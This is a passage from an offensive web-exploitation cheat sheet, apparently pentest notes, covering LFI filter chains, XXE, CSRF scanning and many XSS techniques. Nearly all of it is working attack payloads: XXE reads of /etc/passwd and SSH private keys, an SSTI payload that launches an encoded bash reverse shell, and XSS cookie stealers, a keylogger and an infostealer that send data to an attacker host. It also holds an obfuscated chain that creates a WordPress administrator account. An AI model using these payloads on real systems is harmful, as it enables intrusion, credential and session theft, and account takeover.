base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd&accepted_files=image/gif'
```

## XML External Entity (XXE)

### Prequesites

Possible JSON Implementation

### Skeleton Payload Request

```console
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

### Payloads

```console
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
 <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

```console
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```

```console
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

```console
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\
x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAxIDA+JjEK | base64 -d | b
ash")["read"]() %} a {% endwith %}
```

## XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)

> https://github.com/0xInfection/XSRFProbe

```console
$ xsrfprobe -u https://<RHOST> --crawl --display
```

## Cross-Site Scripting (XSS)

aka JavaScript Injection.

### Common Payloads

```javascript
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>user.changeEmail('user@domain');</script>
</script><svg/onload=alert(0)>
<img src='http://<RHOST>'/>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
```

### Cookie Stealing

```javascript
<script>alert(document.cookies)</script>
<iframe onload="fetch('http://<LHOST>/?c='+document.cookie)">
<img src=x onerror="location.href='http://<LHOST>/?c='+ document.cookie">
<script>fetch('https://<LHOST>/steal?cookie=' + btoa(document.cookie));</script>
```

### Ployglot Payload

Note that `HTML tags` that need to be closed for `XSS`.

```console
<!--
<title>
<textarea>
<style>
<noscript>
<xmp>
<template>
<noembed>
```

```console
--></title></textarea></style></noscript></script></xmp></template></noembed><svg/onload=alert()>
```

### Single Domain One-liner

```console
$ echo https://<DOMAIN>/ | gau | gf xss | uro | Gxss | kxss | tee <FILE>.txt
```

### Reflected XSS

```javascript
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
```

### Reflected XSS at Scale

```console
$ subfinder -d <RHOST> -silent -all | httpx -silent | nuclei -tags xss -exclude-severity info -rl 20 -c 10 -o /PATH/TO/FILE/<FILE>
```

### Stored XSS

```javascript
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
```

### Session Stealing

```javascript
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
```

### Key Logger

```javascript
<script>document.onkeypress = function(e) { fetch('https://<RHOST>/log?key=' + btoa(e.key) );}</script>
```

### Business Logic

JavaScript is calling `user.changeEmail()`. This can be abused.

```javascript
<script>user.changeEmail('user@domain');</script>
```

### Polyglot

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### Single XSS Vector

```javascript
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

### DOM-XSS

#### Main sinks that can lead to DOM-XSS Vulnerabilities

```console
## document.write()
## document.writeln()
## document.domain
## someDOMElement.innerHTML
## someDOMElement.outerHTML
## someDOMElement.insertAdjacentHTML
## someDOMElement.onevent
```

### jQuery Function sinks that can lead to DOM-XSS Vulnerabilities

```console
## add()
## after()
## append()
## animate()
## insertAfter()
## insertBefore()
## before()
## html()
## prepend()
## replaceAll()
## replaceWith()
## wrap()
## wrapInner()
## wrapAll()
## has()
## constructor()
## init()
## index()
## jQuery.parseHTML()
## $.parseHTML()
```

### Skeleton Payload Request

```console
POST /blog-single.php HTTP/1.1
Host: <RHOST>
User-Agent: <script src="http://<LHOST>:<LPORT>/test.html"></script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Origin: http://<RHOST>
DNT: 1
Connection: close
Referer: http://<RHOST>/blog.php
Upgrade-Insecure-Requests: 1

name=test&email=test%40test.de&phone=1234567890&message=<script
src="http://<LHOST>:<LPORT>/test.html"></script>&submit=submit
```

### XSS POST Request

#### XSS post request on behalf of the Victim, with custom Cookies.

```javascript
var xhr = new XMLHttpRequest();
document.cookie = "key=value;";
var uri ="<RHOST>";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("<BODY>");
```

### XSS Web Request

#### XSS web Request on behalf of Victim and sends back the complete Webpage.

```javascript
xmlhttp = new XMLHttpRequest();
xmlhttp.onload = function() {
  x = new XMLHttpRequest();
  x.open("GET", '<LHOST>?'+xmlhttp.response);
  x.send(null);
}
xmlhttp.open("GET", '<RHOST>');
xmlhttp.send(null);
```

### XSS Client-Side Attacks

#### Reverse JavaScript Execution

```javascript
<a href="javascript:fetch('http://<RHOST>/<FILE>').then(r=>r.text()).then(d=>fetch('http://<LHOST>/?response='+encodeURIComponent(d))).catch(e=>console.error('Error:',e));"><COMMENT></a>
```

#### InfoStealer

```javascript
for (let uid = 1; uid <= 15; uid++) {
  fetch(`http://<RHOST>/`)
    .then(r => r.text())
    .then(t => {
      fetch('http://<LHOST>?data=' + btoa(t));
    })
    .catch(err => {
      console.error('Error:', err);
      // If there's an error, make a request to http://<LHOST>/error
      fetch('http://<LHOST>/error');
    });
}
```

#### Trigger

```javascript
document.body.appendChild(Object.assign(document.createElement('script'),{src:'http://<LHOST>/<FILE>.js'})) foo=bar">
  Foo
</body>&content=html&recipient=<EMAIL>
```

#### XSS Client-Side Attack Examples

##### Request Example

```javascript
<a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000"">foobar!</a>
```

##### Get nonce

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

##### Update Payload Script

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

###### Compress Payload Script

> https://jscompress.com/

```javascript
var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

###### Encoding Function

```javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
console.log(encoded)
```

###### Encoded Payload

```console
118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
```

###### Execution

```console
curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
))</script>" --proxy 127.0.0.1:8080
```
